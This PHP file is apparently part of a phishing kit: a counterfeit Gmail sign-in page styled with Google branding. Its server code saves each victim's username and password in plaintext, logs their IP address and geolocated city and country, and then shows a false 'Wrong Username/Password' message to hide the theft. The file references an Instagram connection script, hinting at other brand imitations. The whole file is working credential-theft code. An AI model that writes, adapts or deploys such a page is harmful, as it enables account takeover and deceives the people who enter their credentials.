<?php
// Start the session
session_start();

// Database connection
require_once "../instagram/connect.php";

// Function to get user's IP address
function getUserIpAddr() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; // Use the first IP from the list
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Function to get country based on IP address using ip-api.com
// Function to get location (city and country) based on IP address using ip-api.com
function getLocationByIp($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $response = @file_get_contents($url); // Suppress warnings
    
    if ($response === false) {
        return ['country' => 'Unknown', 'city' => 'Unknown']; // Fallback if API fails
    }
    
    $response = json_decode($response, true);
    
    if (isset($response['status']) && $response['status'] === 'fail') {
        return ['country' => 'Unknown', 'city' => 'Unknown']; // Fallback if IP lookup fails
    }
    
    return [
        'country' => $response['country'] ?? 'Unknown',
        'city'    => $response['city'] ?? 'Unknown'
    ];
}


if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Capture form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Get the actual user's IP address
    $ip_address = getUserIpAddr();

    // Get location details based on user's IP
    $location = getLocationByIp($ip_address);
    $country = $location['country'];
    $city = $location['city'];

    // Store user login details into the database
    $stmt = $conn->prepare("INSERT INTO gm (username, password, ip, country, city) VALUES (?, ?, ?, ?, ?)");
    
    if ($stmt === false) {
        die('MySQL prepare error: ' . htmlspecialchars($conn->error));
    }

    // Bind parameters and execute
    $stmt->bind_param("sssss", $username, $password, $ip_address, $country, $city);

    if ($stmt->execute()) {
        $_SESSION['success_message'] = "Wrong Username/Password";
    } else {
        $_SESSION['error_message'] = "Failed to log user details: " . htmlspecialchars($stmt->error);
    }

    $stmt->close();
    $conn->close();

    // Redirect back to the login page
    header("Location: gmailpage.php");
    exit();
}
?>


<!DOCTYPE html>
<html>
    <head>
        <title>
            Login - Gmail
        </title>
        <meta charset="utf-8">
    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
    <meta http-equiv="refresh" content="60">
    <link rel="icon" href="iconn.jpg" type="image/icon">
    <link rel="stylesheet" type="text/css" href="gmailstyle.css">
    </head>
    <body>

        <div class="first">
        <div class="Container">
            <div class="body2">
            <div class="Top">
        <img src="Googlee.png" alt="Google Image" class="img">

        <p class="Sign"> Sign in </p>
        <p> Use your Google Account </p>
        <br>
    </div>

        <form action="gmailpage.php" method="post">
            <input type="text" placeholder="Email or Phone" name="username" required>
            
            <input type="password" placeholder="Password" name="password" required>
        
            <p> <a href="#" class="a"> Forgot email </a> </p>
        <br>
        <?php if (isset($_SESSION['success_message'])): ?>
            <div class="message" style="color: red;"><?php echo $_SESSION['success_message']; unset($_SESSION['success_message']); ?></div>
        <?php elseif (isset($_SESSION['error_message'])): ?>
            <div class="message" style="color: red;"><?php echo $_SESSION['error_message']; unset($_SESSION['error_message']); ?></div>
        <?php endif; ?>
        <br>
        <P class="not"> Not your device? Use Guest mode to sign in privately </P>
        <P> <a href="#" class="a"> Learn more </a></P>
        <br>
        <div class="create">
            <p> <a href="#" class="a"> Create account </a>  <button>  Next </a></button></p>
        </div>
    </form>

    </div>
</div>

<br>
<p class="end"> English(United States)  <span class="www"> <a href="#"> Help, </a>  <a href="#"> Privacy, </a> <a href="#"> Terms </a></span> </p>
</div>
    </body>
</html>